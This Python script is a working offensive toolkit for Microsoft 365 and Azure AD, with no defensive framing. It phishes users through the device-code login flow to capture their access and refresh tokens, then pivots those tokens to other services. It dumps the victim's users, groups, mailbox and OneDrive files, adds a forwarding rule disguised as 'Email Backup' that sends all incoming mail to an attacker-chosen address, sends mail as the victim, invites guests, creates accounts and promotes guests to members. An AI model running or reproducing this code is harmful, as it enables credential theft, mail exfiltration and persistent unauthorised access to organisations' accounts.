import requests
import time
import jwt
import base64
import json
import pandas as pd

mapping = {
    'ms graph':{'client_id':"d3590ed6-52b3-4102-aeff-aad2292ab01c", 'resource':"https://graph.microsoft.com/"},
    'graph':{'client_id':"d3590ed6-52b3-4102-aeff-aad2292ab01c", 'resource':"https://graph.windows.net/"},
    'substrate' : {'client_id':"d3590ed6-52b3-4102-aeff-aad2292ab01c", 'resource':"https://substrate.office.com/"},
    'teams':{'client_id':"1fec8e78-bce4-4aaf-ab1b-5451cc387264", 'resource':"https://api.spaces.skype.com/"},
    'outlook' : {'client_id':"1fec8e78-bce4-4aaf-ab1b-5451cc387264", 'resource':"https://outlook.office365.com/"},
    'AzureCoreManagement' : {'client_id':"d3590ed6-52b3-4102-aeff-aad2292ab01c", 'resource':"https://management.core.windows.net/"},
    
}

def get_device_code_phish() :
    ENDPOINT = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"

    # data to be sent to api
    data = {
        "client_id": mapping['graph']['client_id'],
        "resource": mapping['graph']['resource']
    }

    # sending post request and saving response as response object
    r = requests.post(url = ENDPOINT, data = data)

    # extracting response text 
    res = r.json()
    code = res['user_code']
    login = res['verification_url']
    device_code = res['device_code']
    #print(res)
    print(code, login)
    print("")
    return(device_code , res['interval'], res['expires_in'])

def get_auth(device_code, interval, expires_in):
    data = {
        "client_id":"d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "grant_type":"urn:ietf:params:oauth:grant-type:device_code",
        "code":device_code,
        "resource":mapping['graph']['resource']
    }

    interval = int(interval)
    expires = int(expires_in)
    count = 0

    auth_data = {}

    while (True) :
        time.sleep(interval)
        count += interval
        if count >= expires :
            print('Timeout')
            break
        r2 = requests.post(url="https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0", data=data)
        res2= r2.json()
        if 'error' in res2.keys() :
            continue
        else:
            print("!!Success -- We Have Token!!\n")
            #print(r2.text)
            auth_data = res2
            break
    token_info = get_token_data(auth_data['access_token'], verbose = True)
    print('Access Token:')
    print(auth_data['access_token'])
    print('\nRefresh Token:')
    print(auth_data['refresh_token'])
    print(f"\nTo run AzureHound:\n.\\azurehound -r {auth_data['refresh_token']} --tenant {token_info['domain']} list -o '{token_info['domain']}.json' ")
    print("")
    return(auth_data)

def get_token_data(access_token, verbose = False):
    split_data = access_token.split('.')
    token_info = json.loads(base64.b64decode(split_data[1] + '=' * (-len(split_data[1]) % 4)).decode("utf-8"))
    domain = token_info['upn'].split('@')[1]
    token_info['domain'] = domain
    # print(token_info)
    if verbose:
        print(f"Domain: {token_info['domain']}")
        print(f"Tenant ID: {token_info['tid']}")
        print(f"User Name: {token_info['name']}")
        print(f"UPN: {token_info['upn']}")
        print(f"Resource: {token_info['aud']}")
        print(f"Expires: {token_info['exp']}")
        print("")
    return token_info

def refresh_token_to(auth_data, resource , verbose = True):
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    TenantId = token_info['tid']
    ENDPOINT = f"https://login.microsoftonline.com/{TenantId}/oauth2/token?api-version=1.0"
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
    }

    # data to be sent to api
    data = {
        "client_id": mapping[resource]['client_id'],
        "resource": mapping[resource]['resource'],
        "grant_type": "refresh_token",
        "refresh_token": auth_data['refresh_token'],
        "scope": "openid"
    }

    # sending post request and saving response as response object
    r = requests.post(url = ENDPOINT, headers= header, data = data)

    # extracting response text
    res = r.json()
    if verbose :
        print(f'Refresh Token To: {resource} :')
        print(res)
        print("")
    return res

def get_users(auth_data) :
    MAX = 15000
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"/users"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    #print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)
    
     # extracting response text 
    temp = r.json()
    res ={'data':[]}
    res['data'] += temp['value']
    
    flag = True
    
    # this part might be broken -- need more testing
    while(flag and len(res['data']) < MAX ):
        if ('@odata.nextLink' in temp.keys()) :
            next_url = temp['@odata.nextLink']
            r_ = requests.get(url = next_url, headers= header)
            temp  = r_.json()
            res['data'] += temp['value']
        else :
            flag = False
            break

    return res

def get_groups(auth_data) :
    MAX = 15000
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"/groups"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    #print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)
    
     # extracting response text 
    temp = r.json()
    res ={'data':[]}
    res['data'] += temp['value']
    
    flag = True
    
    # this part might be broken -- need more testing
    while(flag and len(res['data']) < MAX ):
        if ('@odata.nextLink' in temp.keys()) :
            next_url = temp['@odata.nextLink']
            r_ = requests.get(url = next_url, headers= header)
            temp  = r_.json()
            res['data'] += temp['value']
        else :
            flag = False
            break

    return res

def dump_owa_mailbox_graph_api(auth_data) :
    MAX = 3000
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = "me/MailFolders"
    MAIL_FOLDER = 'AllItems' #'AllItems','inbox','archive','drafts','sentitems','deleteditems','recoverableitemsdeletions'
    FILTER_ = "select=sender,from,toRecipients,ccRecipients,ccRecipients,replyTo,sentDateTime,id,hasAttachments,subject,importance,bodyPreview,isRead,body,parentFolderId"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}/{MAIL_FOLDER}/messages?{FILTER_}"
    #print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    res ={'mail':[]}
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)

    # extracting response text 
    temp = r.json()
    res['mail'] += temp['value']
    
    flag = True
    
    # this part might be broken -- need more testing
    while(flag and len(res['mail']) < MAX ):
        if ('@odata.nextLink' in temp.keys()) :
            next_url = temp['@odata.nextLink']
            r_ = requests.get(url = next_url, headers= header)
            temp  = r_.json()
            res['mail'] += temp['value']
        else :
            flag = False
            break
    
    #print(res['mail'])
    #print(len(res['mail']))
    return res, token_info['upn']

def dump_drive_id_graph_api(auth_data, id_) :
    MAX = 3000
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"/me/drive/items/{id_}/children"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    #print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)
    
     # extracting response text 
    temp = r.json()
    res ={'data':[]}
    res['data'] += temp['value']
    
    flag = True
    
    # this part might be broken -- need more testing
    while(flag and len(res['data']) < MAX ):
        if ('@odata.nextLink' in temp.keys()) :
            next_url = temp['@odata.nextLink']
            r_ = requests.get(url = next_url, headers= header)
            temp  = r_.json()
            res['data'] += temp['value']
        else :
            flag = False
            break

    return res

def dump_drive_graph_api(auth_data) :
    MAX = 3000
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = "me/drive/root/children"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    #print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)
    
     # extracting response text 
    temp = r.json()
    res ={'data':[]}
    res['data'] += temp['value']
    
    flag = True
    
    # this part might be broken -- need more testing
    while(flag and len(res['data']) < MAX ):
        if ('@odata.nextLink' in temp.keys()) :
            next_url = temp['@odata.nextLink']
            r_ = requests.get(url = next_url, headers= header)
            temp  = r_.json()
            res['data'] += temp['value']
        else :
            flag = False
            break
            
    res2 ={'data':[]}
    for i in res['data'] :
        if "folder" in i.keys() :
            if i['folder']['childCount'] > 0 :
                r = dump_drive_id_graph_api(auth_data, i['id'])
                res2['data'] += r['data']
        else:
            res2['data'].append(i)
    
    return res2, token_info['upn']

def owa_inbox_forward(auth_data, name, email) :
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"me/mailFolders/inbox/messageRules"
    # API = f"users/{token_info['upn']}/mailFolders/inbox/messageRules"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    data = {    
        "displayName": "Email Backup",      
        "sequence": 2,
        "isEnabled": True,
        "conditions": {
            "sentToMe": True
        },
        "actions": {
            "forwardTo": [{
                "emailAddress": {
                    "name": f"{name}",
                    "address": f"{email}"
                }
            }],
            "stopProcessingRules": False
        }
    }
    
    # sending post request and saving response as response object
    r  = requests.post(url = ENDPOINT, headers= header, json=data)
    
    res = r.json()

    return res

def owa_send_email(auth_data, message = None):
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"me/sendMail"
    # API = f"users/{token_info['upn']}/sendMail"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    if message is None :
        message = {
            "message": {
                "subject": "Test Email",
                "body": {
                    "contentType": "Text",
                    "content": "This is a test email."
                },
                "toRecipients": [
                    {
                        "emailAddress": {
                            "address": "abc@def.com"
                        }
                    }],
                "attachments": [
                    {
                        "@odata.type": "#microsoft.graph.fileAttachment",
                        "name": "attachment.txt",
                        "contentType": "text/plain",
                        "contentBytes": "SGVsbG8gV29ybGQh"
                    }
                ]
            },
            "saveToSentItems": "false"
        }
    
    # sending post request and saving response as response object
    r  = requests.post(url = ENDPOINT, headers= header, json=message)
    
    res = r.json()

    return res

def owa_send_email_outlook(auth_data, message = None):
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    outlook_token = refresh_token_to(auth_data, 'outlook', verbose = False)
    API_V = "v2.0"
    API = f"me/sendMail"
    # API = f"users/{token_info['upn']}/sendMail"
    ENDPOINT = f"https://outlook.office.com/api/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {outlook_token['access_token']}",
        "Accept": "text/*, multipart/mixed, application/xml, application/json; odata.metadata=none",
        "Content-Type": "application/json; charset=utf-8",
        "X-AnchorMailbox": f"{token_info['upn']}",
        "Prefer": 'exchange.behavior="ActivityAccess"'
    }
    
    if message is None :
        message = {
            "Message": {
                "Subject": "Test Email",
                "Body": {
                    "ContentType": "HTML",
                    "Content": "This is a test email."
                },
                "ToRecipients": [
                    {
                        "EmailAddress": {
                            "Address": "abc@def.com"
                        }
                    }],
                "Attachments": [
                    {
                        "@odata.type": "#Microsoft.OutlookServices.FileAttachment",
                        "Name": "attachment.txt",
                        "ContentBytes": "SGVsbG8gV29ybGQh"
                    }
                ]
            },
            "SaveToSentItems": "false"
        }
    
    # sending post request and saving response as response object
    r  = requests.post(url = ENDPOINT, headers= header, json=message)
    
    if r.status_code == 202:
        print('Mail Sent')

    return

def owa_inbox_forward_outlook(auth_data, name, email) :
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    outlook_token = refresh_token_to(auth_data, 'outlook', verbose = False)
    API_V = "beta"
    API = f"me/mailFolders/inbox/messagerules"
    # API = f"users/{token_info['upn']}/mailFolders/inbox/messageRules"
    ENDPOINT = f"https://outlook.office.com/api/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {outlook_token['access_token']}",
        "Accept": "text/*, multipart/mixed, application/xml, application/json; odata.metadata=none",
        "Content-Type": "application/json",
        "X-AnchorMailbox": f"{token_info['upn']}",
        "Prefer": 'exchange.behavior="ActivityAccess"'
    }
    
    data = {    
        "DisplayName": "Email Backup",      
        "Sequence": 2,
        "IsEnabled": True,
        "Conditions": {
            "SentToMe": True
        },
        "Actions": {
            "ForwardTo": [{
                "EmailAddress": {
                    "Name": f"{name}",
                    "Address": f"{email}"
                }
            }],
            "StopProcessingRules": False
        }
    }
    
    # sending post request and saving response as response object
    r  = requests.post(url = ENDPOINT, headers= header, json=data)
    
    res = r.json()
    return res


def get_permissions(auth_data):
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"/oauth2PermissionGrants"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
    }
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)
    
    # extracting response text 
    temp = r.json()
    res ={'data':[]}
    res['data'] += temp['value']
    
    flag = True
    
    # this part might be broken -- need more testing
    while(flag and len(res['data'])):
        if ('@odata.nextLink' in temp.keys()) :
            next_url = temp['@odata.nextLink']
            r_ = requests.get(url = next_url, headers= header)
            temp  = r_.json()
            res['data'] += temp['value']
        else :
            flag = False
            break

    return res

def get_service_principal(auth_data, ID = None):
    if ID is None:
        print('ID required')
        return
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"/servicePrincipals/{ID}"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)
    
    # extracting response text 
    return r.json()

def get_password(auth_data , user_id = None) :
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    if user_id is None:
        API = f"me/authentication/passwordMethods"
    else:
        API = f"/users/{user_id}/authentication/passwordMethods"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)
    
    res = r.json()

    return res

def invite_user(auth_data, email) :
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"invitations"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    data = {
        "invitedUserEmailAddress": email,
        "inviteRedirectUrl": "https://login.microsoft.com"
    }
    
    # sending post request and saving response as response object
    r  = requests.post(url = ENDPOINT, headers= header, json=data)
    
    res = r.json()

    return res

def get_user(auth_data, user_id) :
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"users/{user_id}"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    # sending post request and saving response as response object
    r  = requests.get(url = ENDPOINT, headers= header)
    
    res = r.json()

    return res

def create_user(auth_data, data = None) :
    # default patch user to member
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"users/"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    if data is None:
        data = {
            "accountEnabled": True,
            "displayName": "Adele Vance",
            "mailNickname": "AdeleV",
            "userPrincipalName": "AdeleV@contoso.onmicrosoft.com",
            "passwordProfile" : {
                "forceChangePasswordNextSignIn": False,
                "password": "xWwvJ]6NMw+bWH-d"
            }

        }
        
    # sending post request and saving response as response object
    r  = requests.post(url = ENDPOINT, headers= header, json=data)
    
    res = r.json()

    return res

def patch_user(auth_data, user_id, data = None) :
    # default patch user to member
    access_token = auth_data['access_token']
    token_info = get_token_data(access_token, verbose = False)
    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
    API_V = "v1.0"
    API = f"users/{user_id}"
    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
    # print(ENDPOINT)
    
    # header
    header = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Authorization": f"Bearer {graph_token['access_token']}",
        'Content-type': "application/json"
    }
    
    if data is None:
        data = {
            'userType': 'Member'
        }

    # sending post request and saving response as response object
    r  = requests.patch(url = ENDPOINT, headers= header, json=data)
    
    res = r.json()

    return res